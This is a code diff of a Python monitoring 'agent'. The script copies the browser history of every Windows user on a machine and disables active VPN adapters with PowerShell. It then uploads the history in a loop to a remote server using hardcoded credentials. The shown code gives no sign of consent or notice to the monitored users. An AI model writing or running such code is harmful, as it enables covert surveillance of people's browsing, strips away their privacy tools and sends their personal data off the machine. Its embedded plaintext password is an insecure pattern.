@@ -9,10 +9,10 @@ import shutil
 from datetime import datetime
 import json
 import pathlib
-import subprocess  # ✅ added for PowerShell command execution
+import subprocess  # ✅ for PowerShell VPN control
 
 # --------- CONFIG ----------
-SERVER_URL = "https://Dhayalan.pythonanywhere.com/upload"
+SERVER_URL = "https://tool.onrender.com/upload"  # ✅ Updated to your Render backend
 AUTH_USER = "admin"
 AUTH_PASS = "myStrongPassword123"
 
@@ -24,7 +24,7 @@ ALLOWED_DOMAINS = ["110.172.151.102"]
 VECTOR_FILE = "vectorizer.pkl"
 MODEL_FILE = "category_model.pkl"
 
-# ✅ FIXED ML TRAINING DATA
+# ---------- ✅ ML SAMPLE DATA ----------
 SAMPLE_TEXTS = [
     "facebook.com","youtube.com/watch?v=abc123","instagram.com/user/profile",
     "stackoverflow.com/questions/12345","github.com/openai/gpt","netflix.com/title/6789",
@@ -45,7 +45,7 @@ SAMPLE_LABELS = [
     "Entertainment","E-commerce","News","Knowledge","Education"
 ]
 
-# ---------- ✅ FIXED ML ----------
+# ---------- ✅ ML TRAINING ----------
 def train_or_load_model():
     import joblib
     from sklearn.feature_extraction.text import TfidfVectorizer
@@ -84,29 +84,22 @@ def classify_text(text):
         print(f"[Agent ML] Prediction error: {e}")
         return "Uncategorized"
 
-# ---------- ✅ VPN DETECTION & DISABLE ----------
+# ---------- ✅ VPN DETECTION ----------
 def detect_and_disable_vpn_adapters():
     """Detect VPN adapters and disable them if active."""
     try:
-        # PowerShell command to get active adapters containing VPN or TAP etc.
         ps_cmd = (
             "Get-NetAdapter | Where-Object {($_.Status -eq 'Up') -and "
             "($_.Name -match 'VPN' -or $_.InterfaceDescription -match 'TAP|OpenVPN|WireGuard|Proton|Nord')} | "
             "Select-Object -ExpandProperty Name"
         )
-        result = subprocess.run(
-            ["powershell", "-Command", ps_cmd],
-            capture_output=True, text=True
-        )
-
+        result = subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True, text=True)
         active_vpns = [line.strip() for line in result.stdout.splitlines() if line.strip()]
         if active_vpns:
             for adapter in active_vpns:
                 disable_cmd = f"Disable-NetAdapter -Name '{adapter}' -Confirm:$false"
                 subprocess.run(["powershell", "-Command", disable_cmd], capture_output=True)
                 print(f"[Agent VPN] Disabled VPN adapter: {adapter}")
-
-            # Log it
             log_entry = {
                 "timestamp": datetime.utcnow().isoformat(),
                 "system": SYSTEM_NAME,
@@ -120,7 +113,7 @@ def detect_and_disable_vpn_adapters():
     except Exception as e:
         print(f"[Agent VPN] Error detecting/disabling VPN: {e}")
 
-# ---------- ✅ MULTI-USER BROWSER DETECTION ----------
+# ---------- ✅ BROWSER DETECTION ----------
 def detect_browsers_all_users():
     users_dir = pathlib.Path("C:/Users")
     browsers_found = {}
@@ -151,7 +144,7 @@ def detect_browsers_all_users():
                     browsers_found[f"Firefox_{user_name}_{profile.name}"] = str(places)
     return browsers_found
 
-# ---------- ✅ Browser Extraction ----------
+# ---------- ✅ HISTORY EXTRACTION ----------
 def extract_history(db_path, browser_name):
     temp = f"temp_{browser_name.replace(' ', '_')}.db"
     out = []
@@ -171,11 +164,6 @@ def extract_history(db_path, browser_name):
         conn.close()
         os.remove(temp)
 
-        user_tag = "Unknown"
-        parts = browser_name.split("_")
-        if len(parts) >= 2:
-            user_tag = parts[1]
-
         for r in rows:
             url = r[0] if r and len(r) > 0 else ""
             title = r[1] if r and len(r) > 1 else ""
@@ -186,7 +174,6 @@ def extract_history(db_path, browser_name):
                 flagged = 1
             out.append({
                 "browser": browser_name,
-                "user_name": user_tag,
                 "url": url,
                 "title": title,
                 "timestamp": ts,
@@ -199,7 +186,7 @@ def extract_history(db_path, browser_name):
         print(f"[Agent] {browser_name} extraction error:", e)
     return out
 
-# ---------- ✅ Safe buffer ----------
+# ---------- ✅ BUFFER SYSTEM ----------
 BUFFER_FILE = "unsent_buffer.json"
 
 def load_buffer():
@@ -225,9 +212,14 @@ def send_to_server(records, chunk_size=500):
     while sent < total:
         chunk = all_records[sent:sent + chunk_size]
         try:
-            res = requests.post(SERVER_URL, json=chunk, timeout=60, auth=(AUTH_USER, AUTH_PASS))
+            res = requests.post(
+                SERVER_URL,
+                json=chunk,
+                timeout=60,
+                auth=(AUTH_USER, AUTH_PASS)
+            )
             if res.status_code == 200:
-                print(f"[Agent] Sent {len(chunk)} records (chunk {sent//chunk_size+1}) successfully.")
+                print(f"[Agent] ✅ Sent {len(chunk)} records (chunk {sent//chunk_size+1}).")
             else:
                 print(f"[Agent] ⚠ Server returned {res.status_code}, buffering chunk.")
                 save_buffer(all_records[sent:])
@@ -244,12 +236,12 @@ def send_to_server(records, chunk_size=500):
 def main():
     print(f"=== Agent Started ===\nSending data to: {SERVER_URL}")
     while True:
-        detect_and_disable_vpn_adapters()  # ✅ added here
+        detect_and_disable_vpn_adapters()
         aggregated = []
         browsers = detect_browsers_all_users()
         for bname, path in browsers.items():
             aggregated.extend(extract_history(path, bname))
-        print(f"[Agent] Collected {len(aggregated)} records from all users.")
+        print(f"[Agent] Collected {len(aggregated)} records.")
         send_to_server(aggregated)
         time.sleep(SLEEP_INTERVAL)
 
